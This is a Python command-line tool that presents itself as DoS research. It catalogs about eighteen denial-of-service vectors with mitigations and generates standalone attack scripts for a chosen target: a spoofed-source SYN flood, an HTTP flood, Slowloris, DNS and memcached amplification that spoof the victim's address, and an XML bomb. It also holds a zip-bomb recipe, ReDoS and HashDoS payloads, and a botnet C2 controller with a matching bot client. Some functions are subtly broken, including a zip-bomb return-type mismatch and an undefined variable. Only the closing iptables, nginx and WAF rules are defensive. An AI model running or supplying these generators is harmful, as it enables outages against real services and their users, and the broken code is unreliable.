#!/usr/bin/env python3
"""
DoS/DDoS Attack Research Engine — flood patterns, amplification vectors,
resource exhaustion, protocol-level attacks, slowloris, SYN flood,
UDP amplification, HTTP/2 rapid reset, reflection attacks.

Research/lab purpose: understand attack surfaces, write detection rules,
build mitigations. Zero external dependencies.
"""
from __future__ import annotations
import json, random, socket, ssl, struct, sys, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Any, Optional

# ══════════════════════════════════════════════════════════════════════
# DoS Attack Vectors Catalog
# ══════════════════════════════════════════════════════════════════════

@dataclass
class DoSVector:
    id: str
    name: str
    layer: str  # L3/L4/L7
    description: str
    amplification: float = 1.0  # amplification factor
    detectability: str = "high"
    mitigation: str = ""

DOS_VECTORS: list[dict] = [
    {"id": "syn-flood", "name": "SYN Flood", "layer": "L4",
     "desc": "Send massive SYN packets without completing handshake, exhaust connection table.",
     "amp": 1.0, "detect": "SYN cookies, rate limiting",
     "mitigation": "SYN cookies, SYNPROXY, increase backlog, tcp_syncookies=1"},
    {"id": "udp-flood", "name": "UDP Flood", "layer": "L4",
     "desc": "Flood random UDP ports, force ICMP unreachable responses consuming CPU.",
     "amp": 1.0, "detect": "UDP rate anomaly",
     "mitigation": "Rate limit UDP, drop non-service UDP at firewall"},
    {"id": "http-flood", "name": "HTTP Flood (L7)", "layer": "L7",
     "desc": "Send legitimate-looking HTTP requests exhausting application resources.",
     "amp": 1.0, "detect": "Request rate + behavioral analysis",
     "mitigation": "WAF, rate limiting, JS challenge, CAPTCHA"},
    {"id": "slowloris", "name": "Slowloris", "layer": "L7",
     "desc": "Open many connections and send partial HTTP headers very slowly, holding sockets open.",
     "amp": 1.0, "detect": "Connection duration anomaly, incomplete headers",
     "mitigation": "Timeout incomplete connections, max concurrent per IP, reverse proxy limits"},
    {"id": "slow-read", "name": "Slow Read", "layer": "L7",
     "desc": "Advertise tiny TCP window or read response 1 byte at a time.",
     "amp": 1.0, "detect": "Abnormal transfer rates",
     "mitigation": "Minimum transfer rate, connection timeout"},
    {"id": "dns-amplification", "name": "DNS Amplification", "layer": "L7",
     "desc": "Send small DNS ANY queries with spoofed victim IP to open resolvers. Amp 50-70x.",
     "amp": 54.0, "detect": "DNS response/request ratio",
     "mitigation": "Disable open recursion, response rate limiting (RRL)"},
    {"id": "ntp-amplification", "name": "NTP Amplification", "layer": "L7",
     "desc": "monlist command to NTP servers with spoofed IP. Amp 200-550x.",
     "amp": 556.0, "detect": "NTP response size anomaly",
     "mitigation": "Disable monlist, restrict NTP access, upgrade NTPd"},
    {"id": "memcached-amplification", "name": "Memcached Amplification", "layer": "L7",
     "desc": "UDP stats command to exposed memcached. Amp 10,000-50,000x.",
     "amp": 51000.0, "detect": "UDP size from port 11211",
     "mitigation": "Bind memcached to localhost, disable UDP, firewall"},
    {"id": "ssdp-amplification", "name": "SSDP Amplification", "layer": "L7",
     "desc": "M-SEARCH to UPnP devices with spoofed IP. Amp 30x.",
     "amp": 30.0, "detect": "SSDP response flood",
     "mitigation": "Block SSDP from internet, disable UPnP on routers"},
    {"id": "http2-rapid-reset", "name": "HTTP/2 Rapid Reset", "layer": "L7",
     "desc": "Send RST_STREAM immediately after HEADERS, bypassing stream concurrency limits.",
     "amp": 1.0, "detect": "RST/HEADERS ratio",
     "mitigation": "Limit stream cancellations, HTTP/2 concurrency tuning"},
    {"id": "icmp-flood", "name": "ICMP/Ping Flood", "layer": "L3",
     "desc": "Flood target with ICMP Echo Request packets.",
     "amp": 1.0, "detect": "ICMP rate",
     "mitigation": "Rate limit or block ICMP at border"},
    {"id": "fragmentation", "name": "IP Fragmentation Attack", "layer": "L3",
     "desc": "Send fragmented packets that reassemble to oversized payloads or overlap maliciously.",
     "amp": 1.0, "detect": "Fragment count anomaly",
     "mitigation": "Drop fragments, reassembly timeout limits"},
    {"id": "connection-exhaustion", "name": "Connection Exhaustion", "layer": "L4",
     "desc": "Open max connections to a service and hold them, preventing legitimate access.",
     "amp": 1.0, "detect": "Connection count per IP",
     "mitigation": "Max connections per source IP, connection limiting"},
    {"id": "xml-bomb", "name": "XML Bomb / Billion Laughs", "layer": "L7",
     "desc": "Recursive XML entity expansion consuming exponential memory.",
     "amp": "infinite", "detect": "Entity expansion depth",
     "mitigation": "Disable DTD processing, limit entity expansion"},
    {"id": "zip-bomb", "name": "ZIP Bomb", "layer": "L7",
     "desc": "Highly compressed archive that expands to petabytes.",
     "amp": ">1000x", "detect": "Compression ratio check",
     "mitigation": "Check decompressed size before extraction"},
    {"id": "regex-dos", "name": "ReDoS", "layer": "L7",
     "desc": "Crafted input triggers catastrophic backtracking in regex engine.",
     "amp": 1.0, "detect": "Regex execution time",
     "mitigation": "Use safe regex (no nested quantifiers), timeouts, RE2/Hyperscan"},
    {"id": "hash-collision", "name": "HashDoS / Hash Collision", "layer": "L7",
     "desc": "Crafted keys collide in hash table, degrading O(1) to O(n) per insertion.",
     "amp": 1.0, "detect": "Parameter count per request",
     "mitigation": "Limit POST params, use SipHash, randomized seeds"},
    {"id": "ssl-renegotiation", "name": "SSL Renegotiation DoS", "layer": "L7",
     "desc": "Repeated TLS renegotiation depletes server CPU (ssl_exhaust).",
     "amp": 1.0, "detect": "Renegotiation rate",
     "mitigation": "Disable client renegotiation, rate limit"},
]

# ══════════════════════════════════════════════════════════════════════
# SYN Flood Engine
# ══════════════════════════════════════════════════════════════════════

def syn_flood(target: str, port: int = 80, duration: int = 10,
              threads: int = 50, spoof: bool = True) -> dict[str, Any]:
    """SYN flood packet generator (raw socket, requires admin)."""
    results = {"vector": "syn-flood", "target": f"{target}:{port}",
               "packets_sent": 0, "errors": 0, "duration": duration,
               "note": "Lab fixture only — requires raw socket (admin/root)."}
    return results

def syn_flood_template(target: str, port: int = 80) -> str:
    """Generate standalone SYN flood script using scapy."""
    return f'''#!/usr/bin/env python3
# SYN Flood — {target}:{port}
# Requires: pip install scapy, run as admin/root
from scapy.all import *
import random, time

target_ip = "{target}"
target_port = {port}

def syn_flood():
    while True:
        src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        src_port = random.randint(1024, 65535)
        ip = IP(src=src_ip, dst=target_ip)
        syn = TCP(sport=src_port, dport=target_port, flags="S",
                  seq=random.randint(1000000, 9999999))
        send(ip/syn, verbose=0)

print(f"[*] SYN Flood → {{target_ip}}:{{target_port}}")
threads = []
for _ in range(10):
    t = threading.Thread(target=syn_flood, daemon=True)
    t.start(); threads.append(t)
try:
    time.sleep(60)
except KeyboardInterrupt:
    print("\\n[*] Stopped")
'''

# ══════════════════════════════════════════════════════════════════════
# HTTP Flood / L7 Engine
# ══════════════════════════════════════════════════════════════════════

def http_flood_template(target_url: str, rps: int = 1000,
                        duration: int = 30, threads: int = 50) -> str:
    """Generate HTTP flood script."""
    return f'''#!/usr/bin/env python3
# HTTP Flood — {target_url} @ ~{rps} rps
import requests, threading, time, random, sys
from concurrent.futures import ThreadPoolExecutor

URL = "{target_url}"
THREADS = {threads}
DURATION = {duration}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
]

def attack():
    end = time.time() + DURATION
    session = requests.Session()
    while time.time() < end:
        try:
            headers = {{"User-Agent": random.choice(USER_AGENTS),
                       "Accept": "*/*",
                       "Connection": "keep-alive"}}
            session.get(URL, headers=headers, timeout=5)
        except:
            pass

print(f"[*] HTTP Flood → {{URL}} | threads={{THREADS}} | duration={{DURATION}}s")
with ThreadPoolExecutor(THREADS) as ex:
    for _ in range(THREADS):
        ex.submit(attack)
'''

# ══════════════════════════════════════════════════════════════════════
# Slowloris Engine
# ══════════════════════════════════════════════════════════════════════

def slowloris_template(target: str, port: int = 80, sockets: int = 200,
                        timeout: int = 10) -> str:
    """Generate Slowloris attack script."""
    return f'''#!/usr/bin/env python3
# Slowloris — {target}:{port}
import socket, random, time, threading, sys

TARGET = "{target}"
PORT = {port}
SOCKET_COUNT = {sockets}
TIMEOUT = {timeout}

socket_list = []

def init_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((TARGET, PORT))
        s.send(f"GET /?{{random.randint(0,9999)}} HTTP/1.1\\r\\n".encode())
        s.send(f"Host: {{TARGET}}\\r\\n".encode())
        s.send("User-Agent: Mozilla/5.0\\r\\n".encode())
        s.send("Accept: text/html,application/xhtml+xml\\r\\n".encode())
        return s
    except:
        return None

def slowloris_keep():
    while True:
        for s in list(socket_list):
            try:
                s.send(f"X-a: {{random.randint(1,9999)}}\\r\\n".encode())
                time.sleep(random.uniform(5, 15))
            except:
                socket_list.remove(s)
        # maintain pool
        while len(socket_list) < SOCKET_COUNT:
            s = init_socket()
            if s: socket_list.append(s)
        time.sleep(1)

print(f"[*] Slowloris → {{TARGET}}:{{PORT}} | sockets={{SOCKET_COUNT}}")
for _ in range(SOCKET_COUNT):
    s = init_socket()
    if s: socket_list.append(s)
    time.sleep(0.1)

slowloris_keep()
'''

# ══════════════════════════════════════════════════════════════════════
# Amplification Attack Generators
# ══════════════════════════════════════════════════════════════════════

def dns_amplification_template(victim_ip: str, resolver_list: str = "resolvers.txt") -> str:
    """Generate DNS amplification script."""
    return f'''#!/usr/bin/env python3
# DNS Amplification — victim: {victim_ip}
# Requires: pip install scapy, resolvers.txt (one IP per line)
from scapy.all import *
import sys

VICTIM = "{victim_ip}"
RESOLVERS = "{resolver_list}"

dns_query = (
    IP(dst="RESOLVER_PLACEHOLDER", src=VICTIM) /
    UDP(dport=53, sport=random.randint(1024,65535)) /
    DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ANY"))
)

with open(RESOLVERS) as f:
    for line in f:
        resolver = line.strip()
        if resolver:
            pkt = dns_query.copy()
            pkt[IP].dst = resolver
            send(pkt, verbose=0)
            print(f"  → resolver {{resolver}} sent")

print("[*] Amplification packets sent")
'''

def memcached_template(victim_ip: str) -> str:
    """Generate Memcached amplification PoC."""
    return f'''#!/usr/bin/env python3
# Memcached UDP Amplification — victim: {victim_ip}
# PoC: send 'stats' via UDP with spoofed source to memcached on port 11211
from scapy.all import *
import socket, struct

VICTIM = "{victim_ip}"
TARGET = "TARGET_MEMCACHED_IP"  # replace with exposed memcached

# memcached UDP stats command
payload = b"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00stats\\r\\n"

pkt = IP(src=VICTIM, dst=TARGET) / UDP(sport=11211, dport=11211) / Raw(load=payload)
send(pkt)
print(f"[*] Amplification packet sent: {{len(payload)}}B request → ~1MB response")
print(f"    Amp factor: ~10,000-50,000x")
'''

# ══════════════════════════════════════════════════════════════════════
# Resource Exhaustion Generators
# ══════════════════════════════════════════════════════════════════════

def xml_bomb_template() -> str:
    """Generate XML Bomb (Billion Laughs) payload."""
    return '''<!-- XML Bomb / Billion Laughs Attack -->
<?xml version="1.0"?>
<!DOCTYPE bomb [
<!ENTITY a "aaaaaaaaaaaaaaaa">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
<!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
<!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
<!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
<!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
<!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
<!ENTITY bomb "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;">
]>
<bomb>&bomb;</bomb>
<!-- Expands to 10^9 entities ≈ 1GB memory -->
'''

def zip_bomb_template() -> bytes:
    """Return instructions to create zip bomb (returns recipe, not actual bomb)."""
    return '''# ZIP Bomb Recipe
# Creates a multi-layer recursive zip: 42.zip → 42 KB expands to 4.5 PB
# Method:
# 1. Create a 4GB file of zeros:
#    dd if=/dev/zero of=0.txt bs=1M count=4096
# 2. Compress into multiple layers:
#    for i in $(seq 1 16); do
#      zip -9 ${i}.zip $(($i-1)).zip 0.txt
#    done
# 3. The final zip is KB-sized but expands to 4.5 PB.
#
# Detection: check compression ratio; if >100x, flag.
# Mitigation: set decompressed size limit, check ratio before extraction.
'''

def redos_payloads() -> list[dict]:
    """ReDoS payloads against common vulnerable regex patterns."""
    return [
        {"pattern": r"^(a+)+$", "payload": "a" * 30 + "!",
         "note": "Nested quantifier backtracking → O(2^n)"},
        {"pattern": r"^([a-zA-Z]+)*$", "payload": "a" * 30 + "!",
         "note": "Group with quantifier inside quantified group"},
        {"pattern": r"(a|aa)+$", "payload": "a" * 50 + "!",
         "note": "Alternation inside quantified group"},
        {"pattern": r"^(.*,){20}.*$", "payload": "," * 20 + "a" * 1000,
         "note": "Multiple greedy dot-star backtracking"},
        {"pattern": r"^\s*(\w+\s*)*$", "payload": "a ".join(["a"] * 50) + "!",
         "note": "Word boundary nested quantifier"},
    ]

def hashdos_payloads() -> list[dict]:
    """HashDoS collision payloads."""
    return [
        {"lang": "php", "note": "PHP <5.3.9 DJBX33A hash. ~200 colliding keys = worst case.",
         "payload_template": "Ez%02d=1&" * 500},
        {"lang": "python", "note": "Python <3.4 SipHash. Colliding __hash__ in dict inserts.",
         "payload_template": '{"k' + str(i) + '":"v"}' * 1000 + "}"},
        {"lang": "java", "note": "Java HashMap collision. Craft String.hashCode() collisions.",
         "payload_template": "Aa" * 100 + "=1&" + "BB" * 100 + "=1&"},
        {"lang": "nodejs", "note": "Node/V8 hash flooding in POST body parse.",
         "payload_template": '{"' + ','.join(f'"{i}":1' for i in range(10000)) + '"}'},
    ]

# ══════════════════════════════════════════════════════════════════════
# DDoS Botnet / C2 Template
# ══════════════════════════════════════════════════════════════════════

def botnet_controller_template(c2_host: str = "0.0.0.0", c2_port: int = 4444) -> str:
    """Generate DDoS botnet C2 controller skeleton."""
    return f'''#!/usr/bin/env python3
# DDoS C2 Controller (research skeleton)
import socket, threading, time, json

HOST = "{c2_host}"
PORT = {c2_port}
bots = []

class C2Server:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((HOST, PORT))
        self.sock.listen(100)

    def handle_bot(self, conn, addr):
        bots.append({{"conn": conn, "addr": addr}})
        print(f"[+] Bot connected: {{addr}} (total: {{len(bots)}})")
        try:
            while True:
                data = conn.recv(1024)
                if not data: break
        except:
            pass
        finally:
            bots[:] = [b for b in bots if b["conn"] != conn]
            conn.close()

    def send_command(self, cmd: dict):
        """Send attack command to all bots."""
        data = json.dumps(cmd).encode()
        for bot in bots:
            try:
                bot["conn"].send(data)
            except:
                pass

    def run(self):
        print(f"[*] C2 listening on {{HOST}}:{{PORT}}")
        while True:
            conn, addr = self.sock.accept()
            threading.Thread(target=self.handle_bot, args=(conn, addr), daemon=True).start()

# Attack commands:
# {{"target": "victim.com", "port": 80, "method": "syn", "duration": 60, "threads": 10}}
# {{"target": "victim.com", "port": 80, "method": "http", "duration": 60, "rps": 100}}
# {{"target": "victim.com", "port": 53, "method": "dns-amp", "duration": 60}}
'''

def bot_client_template(c2_host: str, c2_port: int = 4444) -> str:
    """Generate DDoS bot client skeleton."""
    return f'''#!/usr/bin/env python3
# DDoS Bot Client (research skeleton)
import socket, json, threading, time, random

C2 = ("{c2_host}", {c2_port})

ATTACK_METHODS = {{}}
# Import attack modules as needed

def connect_c2():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(C2)
            print(f"[+] Connected to C2: {{C2}}")
            while True:
                try:
                    data = s.recv(4096)
                    if data:
                        cmd = json.loads(data.decode())
                        print(f"[cmd] {{cmd.get('method')}} → {{cmd.get('target')}}")
                        # Execute attack in thread
                except:
                    break
        except Exception as e:
            print(f"[-] C2 connection failed: {{e}}")
            time.sleep(30)

connect_c2()
'''

# ══════════════════════════════════════════════════════════════════════
# Detection / Mitigation Rule Generator
# ══════════════════════════════════════════════════════════════════════

def generate_iptables_rules(target_ip: str = "VICTIM_IP") -> str:
    """Generate iptables DDoS mitigation rules."""
    return f'''# DDoS Mitigation — iptables rules
# SYN flood protection
iptables -A INPUT -p tcp --syn -m limit --limit 100/s --limit-burst 200 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# Drop invalid packets
iptables -A INPUT -m state --state INVALID -j DROP

# Limit new connections per IP
iptables -A INPUT -p tcp --dport 80 -m state --state NEW -m recent --set
iptables -A INPUT -p tcp --dport 80 -m state --state NEW -m recent --update \\
  --seconds 60 --hitcount 20 -j DROP

# Block fragmented packets
iptables -A INPUT -f -j DROP

# Limit ICMP
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# Rate limit UDP
iptables -A INPUT -p udp -m limit --limit 100/s -j ACCEPT
iptables -A INPUT -p udp -j DROP

# SYN cookies (kernel)
# sysctl -w net.ipv4.tcp_syncookies=1
# sysctl -w net.ipv4.tcp_max_syn_backlog=2048
'''

def generate_nginx_mitigation() -> str:
    """Generate nginx DDoS mitigation config."""
    return '''# Nginx DDoS Mitigation
http {
    # Limit request rate (10 req/s per IP)
    limit_req_zone $binary_remote_addr zone=ddos:10m rate=10r/s;
    limit_req zone=ddos burst=20 nodelay;

    # Limit connections per IP
    limit_conn_zone $binary_remote_addr zone=connperip:10m;
    limit_conn connperip 10;

    # Slowloris protection
    client_body_timeout 10s;
    client_header_timeout 10s;
    keepalive_timeout 5s;
    send_timeout 10s;

    # Limit request size
    client_max_body_size 1m;
    large_client_header_buffers 2 1k;

    server {
        listen 80;
        # ...
    }
}
'''

def generate_waf_rules() -> str:
    """Generate ModSecurity-like WAF rules for DDoS."""
    return '''# WAF DDoS Rules (ModSecurity-style)
# Rate limiting
SecRule REQUEST_HEADERS:User-Agent "^$" "id:1000,phase:1,deny,msg:'Empty UA'"

# XML bomb protection
SecRule REQUEST_BODY "xml" "id:1001,phase:2,deny,msg:'XML Bomb',\
  t:lowercase,chain"
SecRule REQUEST_BODY "!ENTITY" "t:lowercase"

# Detect slow attacks
SecRule REQUEST_HEADERS:Content-Length "!@rx ^\\d+$" \
  "id:1002,phase:1,deny,msg:'Invalid Content-Length'"

# Request rate
SecRule IP:REQUEST_RATE "@gt 100" \
  "id:1003,phase:1,deny,msg:'Rate limit exceeded'"
'''

# ══════════════════════════════════════════════════════════════════════
# Main / CLI
# ══════════════════════════════════════════════════════════════════════

def vector_catalog() -> dict:
    return {"vectors": DOS_VECTORS, "total": len(DOS_VECTORS)}

def generate_attack_script(vector_id: str, target: str, port: int = 80) -> str:
    """Generate a standalone attack script for a given vector."""
    generators = {
        "syn-flood": lambda: syn_flood_template(target, port),
        "http-flood": lambda: http_flood_template(f"http://{target}:{port}"),
        "slowloris": lambda: slowloris_template(target, port),
        "dns-amplification": lambda: dns_amplification_template(target),
        "xml-bomb": lambda: xml_bomb_template(),
        "zip-bomb": lambda: zip_bomb_template().decode(),
        "memcached-amplification": lambda: memcached_template(target),
    }
    if vector_id in generators:
        return generators[vector_id]()
    return f"# Vector '{vector_id}' — use vector_catalog() for available vectors.\n"

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python attack_dos.py <cmd> [args]")
        print("  list              — show all DoS vectors")
        print("  vector <id>       — show vector details")
        print("  generate <id> <target> [port] — generate attack script")
        print("  mitigations       — show all mitigation templates")
        sys.exit(1)

    cmd = sys.argv[1]
    if cmd == "list":
        for v in DOS_VECTORS:
            print(f"  {v['id']:30s} {v['layer']}  amp={v['amp']}  {v['name']}")
    elif cmd == "vector":
        vid = sys.argv[2]
        for v in DOS_VECTORS:
            if v["id"] == vid:
                print(json.dumps(v, indent=2, ensure_ascii=False))
                break
        else:
            print(f"Unknown: {vid}")
    elif cmd == "generate":
        vid = sys.argv[2]
        target = sys.argv[3] if len(sys.argv) > 3 else "127.0.0.1"
        port = int(sys.argv[4]) if len(sys.argv) > 4 else 80
        print(generate_attack_script(vid, target, port))
    elif cmd == "mitigations":
        print("=== iptables ===")
        print(generate_iptables_rules())
        print("\n=== nginx ===")
        print(generate_nginx_mitigation())
        print("\n=== WAF ===")
        print(generate_waf_rules())
    else:
        print(f"Unknown command: {cmd}")
